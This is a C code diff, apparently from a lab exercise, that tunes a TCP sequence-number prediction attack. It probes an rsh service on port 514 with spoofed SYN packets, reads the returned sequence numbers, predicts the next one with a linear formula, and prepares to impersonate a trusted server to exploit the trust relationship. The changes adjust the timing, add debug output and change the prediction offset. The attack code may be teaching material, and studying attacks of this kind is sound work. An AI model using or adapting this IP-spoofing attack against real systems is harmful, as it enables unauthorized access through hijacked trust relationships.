@@ -189,7 +189,7 @@ int main (void)
 		//printf("probe\n");
 		//send syn packets to shell in xterm, with kevin ip, to read the real synack and compute next sequence number
 		send_syn(514, 514, NULL, 0, l, xterm_ip, kevin_ip);
-		usleep(500);
+		usleep(1000);
 		packet = pcap_next(handle, &header);
 
 		ip_hdr = (struct ip_hdr *) (packet + SIZE_ETH);
@@ -197,7 +197,7 @@ int main (void)
 
 		tcp_seq seq = htonl(tcp_hdr->th_seq);
 		tcp_seq ack = htonl(tcp_hdr->th_ack);
-
+		//usleep(1000);
 		printf("seq %u, ack %u\n", seq, ack);
 		seq_array[i] = seq;
 
@@ -210,7 +210,7 @@ int main (void)
 	printf("%u\n", compute_next_seq(seq_array[1], seq_array[0]) -1);
 
 	tcp_seq predicted_seq = compute_next_seq(seq_array[2], seq_array[1]);
-
+	printf("predicted next seq %u\n", predicted_seq);
 	//exploit trust relation
 
 	//send syn impersonating the server
@@ -374,6 +374,6 @@ tcp_seq compute_next_seq(tcp_seq n1, tcp_seq n2)
 {
 	//expression for next sequence number
 	//seq(N) = 2seq(N-1) - seq(N-2) + 3
-	tcp_seq n = 2*n1 - n2 + 3;
+	tcp_seq n = 2*n1 - n2 + 3 + 1;
 	return n;
 }
